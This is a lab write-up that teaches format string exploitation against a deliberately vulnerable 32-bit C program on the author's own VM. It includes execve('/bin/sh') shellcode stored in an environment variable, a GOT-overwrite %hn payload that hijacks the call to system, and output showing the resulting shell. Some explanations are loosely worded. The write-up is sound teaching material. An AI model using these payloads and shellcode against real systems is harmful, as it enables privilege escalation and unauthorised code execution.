# Format string vulnerability:

This challenge is running on my own VM. I will give you an access as soon as possible.

Here is the script:
```c
#include <stdio.h>
// compile with: gcc -o format -m32 format.c -z execstack -fno-stack-protector

int main(int argc, char** argv){
	char msg[200];

	fgets(msg, 200, stdin);

	puts("Here is your message:");
	printf(msg);
	system("/bin/cat /home/ch03/file.txt");

	return 0;
}
```

I disabled ASLR:
```bash
cat /proc/sys/kernel/randomize_va_space
0
```

This script is vulnerable, the goal of this paper is to understand how we can use it.

## Proof of concept:
```bash
./format < <(python -c "print 'AAAABBBB' + '.%x' * 100")
Here is your message:
AAAABBBB.c8.b7fc7ac0.bffff6e4.bffff6a0.b7fe7ed9.41414141.42424242.2e78252e.[..]
hello, nice file isn't it?
```

Here we see obviously that there is a problem with this executable. His right usage should be:
```bash
./format < <(python -c "print 'AAAABBBB'")
Here is your message:
AAAABBBB.%x.%x.%x[..]
hello, nice file isn't it?
```

Printf waits for a format when we call it (look at printf's man page for more information).
Interesting formats are:

- %x for addresses and to write bytes,
- %s for reading strings,
- %n for writing on the stack how many bytes where written on output.

We can print arbitrary offsets with the format '$':
```bash
./format < <(python -c "print 'AAAABBBB' + '.%6\$x.%7\$x'")
Here is your message:
AAAABBBB.41414141.42424242
hello, nice file isn't it?
```

## Information hunting:

Now, we have the offsets of the first chars given in input. Lets pown this binary.
We will not use gdb for this challenge (this is what is so great with format string bugs)

With readelf, we can see the Global Offset Table:

```bash
readelf -r ./format
Relocation section '.rel.dyn' at offset 0x2f8 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff0  00000506 R_386_GLOB_DAT    00000000   __gmon_start__
0804a020  00000805 R_386_COPY        0804a020   stdin

Relocation section '.rel.plt' at offset 0x308 contains 6 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   printf
0804a004  00000207 R_386_JUMP_SLOT   00000000   fgets
0804a008  00000307 R_386_JUMP_SLOT   00000000   puts
0804a00c  00000407 R_386_JUMP_SLOT   00000000 =>system <=
0804a010  00000507 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a014  00000607 R_386_JUMP_SLOT   00000000   __libc_start_main
```

At the end, the program calls system to read _file.txt_.
This system call is not vulnerable but we will use this opportunity to call some shellcode instead of executing the system function.

Lets do this, but before, we will load a shellcode into the environnement:
```bash
export LOGNAME=$(python -c "print '\x90' * 100 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'")
```

And we use this little code to have its address in memory:
```c
#include <stdio.h>

int main(){
    printf("Logname at: %p\n", getenv("LOGNAME"));

        return 0;
}
```

```bash
./leakadress
Logname at: 0xbffffef6
```

Now we are ready!

## Exploitation

With this little [tool](https://github.com/TiWim/format-string), it will by very simple to compute offsets, numbers and addresses:

```bash
-------------------------------------input:-------------------------------------
Padding [0]: 0
Offset [1]: 6
What [0xdeadbeef]: 0xbffffef6
Where [0xdeadc0de]: 0804a00c
-------------------------------------result-------------------------------------
Payload len: 32
Address: \x0c\xa0\x04\x08\x0e\xa0\x04\x08
Payload: python -c "print '\x0c\xa0\x04\x08\x0e\xa0\x04\x08%49143x%7\$hn%16119x%6\$hn'"
------------------------------------Have Fun!-----------------------------------
```

We just have to execute the program with the given payload:


```bash
(python -c "print '\x0c\xa0\x04\x08\x0e\xa0\x04\x08%49143x%7\$hn%16119x%6\$hn'"; cat) | ./format
id
uid=1005(p0wn3dch03) gid=1008(ch03) groups=1005(p0wn3dch03),1008(ch03)
```

## Explanation:

Convinced ?
What did we do?
We wrote an arbitrary value at an arbitrary place: We wrote the address of our shellcode at the location of __system__

The GOT is a table containing pointers to the real location of libc functions. It is possible to overwrite these pointers like we just did.

As said before, %x allows us to read four bytes. We can go further with %x: %100x will read four bytes but will display 100 bytes.
Coupled with %n, we will write 100 bytes on stdout and write the value 100 (in hexadecimal) on the stack on an int (four bytes).

%hn will write a short int (two bytes)
%hhn will write one byte.

How does it work ?

int i = 0;
printf("%x%n", i, i);

This will display the address of i followed by "4" because the address of is four bytes in x32.

Notice that you can shorten printf("%x%n", i, i); with printf("%1$x%1$n", i);

This is exactly what we will do now.

###Â Analyse of the payload:
-------------------------------------input:-------------------------------------
Padding [0]:
Offset [1]:
What [0xdeadbeef]:
Where [0xdeadc0de]:
-------------------------------------result-------------------------------------
Payload len: 31
Address: \xde\xc0\xad\xde\xe0\xc0\xad\xde
Payload: \xde\xc0\xad\xde\xe0\xc0\xad\xde%48871x%1$hn%8126x%2$hn
--------------------------------------------------------------------------------

"\xde\xc0\xad\xde"+"\xe0\xc0\xad\xde"+"%48871x%1$hn"+"%8126x%2$hn"
The first four bytes are an address where we want to write (0xdeadc0de).
This address will be used by %48871x%1$hn. It will write 48871 + 8 (because of the 8bytes used for the two addresses) on 0xdeadc0de.
If you look at it with gdb, you will see that it prints 0xbeef.
The second four bytes are used for the second group: "%8126x%2$hn". Now, we will write 8 + 48871 + 8126 on 0xdeadc0e0. This corresponds to 0xdead.

Finally, on 0xdeadc0de you will see 0xdeadbeef.

With this bug, we can write on any writable section of an executable. Nice isn't it ?
